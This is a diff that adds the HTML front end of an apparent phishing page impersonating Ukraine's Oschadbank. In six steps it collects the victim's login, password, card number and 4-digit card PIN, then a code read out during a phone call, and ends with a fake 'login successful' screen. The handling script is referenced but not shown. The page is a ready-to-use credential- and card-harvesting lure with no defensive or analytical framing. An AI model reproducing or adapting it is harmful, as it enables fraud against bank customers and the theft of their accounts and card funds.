@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вхід в Ощадбанк</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <div class="oschad-container">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loader"></div>
+            <div class="loading-text" id="loadingText">Завантаження...</div>
+        </div>
+
+        <div class="logo-container">
+            <div class="logo-circle">
+                <img src="/img/oshad.png" alt="Ощадбанк">
+            </div>
+            <h1 class="header-title">Вхід в Ощадбанк</h1>
+        </div>
+
+        <div class="oschad-steps">
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Крок 1 з 6</div>
+            </div>
+
+            <div class="step active" id="step1">
+                <h2 class="step-title">Ваш логін</h2>
+                <p class="step-description">Введіть логін, який ви використовуєте для входу</p>
+                <div class="input-group">
+                    <label class="input-label">Логін</label>
+                    <input type="text" class="oschad-input" id="login" placeholder="Ваш логін">
+                </div>
+                <button class="oschad-btn" id="nextToPassword">Продовжити</button>
+            </div>
+
+            <div class="step" id="step2">
+                <h2 class="step-title">Ваш пароль</h2>
+                <p class="step-description">Введіть пароль для входу в Ощадбанк</p>
+                <div class="input-group">
+                    <label class="input-label">Пароль</label>
+                    <input type="password" class="oschad-input" id="password" placeholder="Ваш пароль">
+                </div>
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToLogin">Назад</button>
+                    <button class="oschad-btn" id="nextToCard">Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step3">
+                <h2 class="step-title">Ваша картка</h2>
+                <p class="step-description">Введіть номер вашої банківської картки</p>
+                <div class="input-group">
+                    <label class="input-label">Номер картки</label>
+                    <input type="text" class="oschad-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+                </div>
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToPassword">Назад</button>
+                    <button class="oschad-btn" id="nextToPin">Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step4">
+                <h2 class="step-title">PIN-код</h2>
+                <p class="step-description">Введіть 4-значний PIN-код від вашої картки</p>
+                <div class="code-container">
+                    <input type="tel" class="code-input" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToCard">Назад</button>
+                    <button class="oschad-btn" id="nextToCall" disabled>Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step5">
+                <h2 class="step-title">Підтвердження</h2>
+                <p class="step-description">На ваш номер телефону зараз буде здійснено дзвінок</p>
+                <div class="call-info">
+                    <i class="fas fa-phone-alt" style="color: var(--oschad-primary); font-size: 24px; margin-bottom: 10px;"></i>
+                    <p>Підніміть слухавку, натисніть 1 та прослухайте код, після введіть його в поле нижче</p>
+                </div>
+                <div class="code-container">
+                    <input type="tel" class="code-input" id="callCode1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div class="status-message" id="callMessage"></div>
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToPin">Назад</button>
+                    <button class="oschad-btn" id="verifyCallCode" disabled>Підтвердити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step6">
+                <div class="success-screen">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2 class="step-title">Вхід успішний!</h2>
+                    <p class="step-description">Ви успішно авторизувались в Ощадбанк</p>
+                    <div class="status-message success">
+                        Зараз ви будете перенаправлені в особистий кабінет
+                    </div>
+                    <button class="oschad-btn" id="finishBtn">Перейти в кабінет</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/js/script.js" defer></script>
+</body>
+</html>
